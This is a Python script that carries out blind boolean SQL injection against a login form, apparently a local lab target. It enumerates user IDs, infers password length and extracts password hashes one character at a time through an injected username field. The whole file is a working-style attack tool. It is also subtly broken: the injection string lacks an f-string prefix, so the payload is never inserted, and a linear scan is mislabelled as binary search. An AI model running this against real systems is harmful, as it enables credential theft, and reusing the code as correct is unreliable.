import requests

# Counter to track number of queries made
total_queries = 0
# Character set for hexadecimal password (0-9, a-f)
charset = "0123456789abcdef"
# Target URL for the vulnerable web application
target = "http://127.0.0.1:5000"
# Needle string to identify successful authentication responses
needle = "Welcome Back"


def injected_query(payload):
    """
    Execute a SQL injection query against the target.

    Args:
        payload: SQL payload to inject into the query

    Returns:
        bool: True if injection was successful (needle not found), False otherwise
    """
    global total_queries
    # Send POST request with SQL injection in username field
    r = requests.post(
        target,
        data={
            "username": "admin' and {payload}--",  # SQL injection point
            "password": "password"  # Dummy password
        }
    )
    total_queries += 1  # Increment query counter
    # Check if authentication was successful (needle present in response)
    return needle.encode() not in r.content


def boolean_query(offset, user_id, character, operator=">"):
    """
    Construct and execute a boolean-based SQL injection query.

    Args:
        offset: Position in the password string (0-based)
        user_id: ID of the user to extract password from
        character: Character to compare against
        operator: Comparison operator (default is ">")

    Returns:
        bool: Result of the boolean query
    """
    # Build SQL payload that compares hex values of password characters
    payload = f"(select hex(substr(password, {offset+1}, 1)) from user where id = {user_id}) {operator} hex('{character}')"
    return injected_query(payload)


def invalid_user(user_id):
    """
    Check if a user ID exists in the database.

    Args:
        user_id: User ID to check

    Returns:
        bool: True if user doesn't exist, False if user exists
    """
    payload = f"(select id from user where id = {user_id})"
    return injected_query(payload)


def password_length(user_id):
    """
    Determine the length of a user's password using binary search approach.

    Args:
        user_id: User ID whose password length to find

    Returns:
        int: Length of the password
    """
    i = 0
    while True:
        # Query checks if password length is <= current i
        payload = f"(select length(password) from user where id = {user_id} and length(password) <= {i} limit 1)"
        if not injected_query(payload):
            return i  # Found the length when condition becomes false
        i += 1


def extract_hash(charset, user_id, password_length):
    """
    Extract the password hash character by character using boolean inference.

    Args:
        charset: Character set to try (hex digits)
        user_id: User ID to extract password from
        password_length: Length of the password to extract

    Returns:
        str: The extracted password hash
    """
    found = ""
    # Iterate through each character position in the password
    for i in range(0, password_length):
        # Try each possible character in the charset
        for j in range(len(charset)):
            # Check if current position's character > charset[j]
            if boolean_query(i, user_id, charset[j]):
                # If true, character must be greater than charset[j]
                # Move to next character in charset
                continue
            else:
                # Found the correct character
                found += charset[j]
                break
    return found


def total_queries_taken():
    """
    Print and reset the total queries counter.
    """
    global total_queries
    print(f"\t\t[!] {total_queries} total queries!")
    total_queries = 0  # Reset counter


# Main interactive loop
while True:
    try:
        # Prompt for user ID to attack
        user_id = input("> Enter a User ID to extract the password hash: ")

        # Check if user exists
        if not invalid_user(user_id):
            # User exists, proceed with extraction

            # Step 1: Find password length
            user_password_length = password_length(user_id)
            print(f"\t[-] User {user_id} hash length: {user_password_length}")
            total_queries_taken()  # Show queries used for length detection

            # Step 2: Extract the actual hash
            print(
                f"\t[-] User {user_id} hash: {extract_hash(charset, int(user_id), user_password_length)}")
            total_queries_taken()  # Show queries used for hash extraction
        else:
            # User doesn't exist
            print(f"[X] User {user_id} does not exist!")

    except KeyboardInterrupt:
        # Exit on Ctrl+C
        break
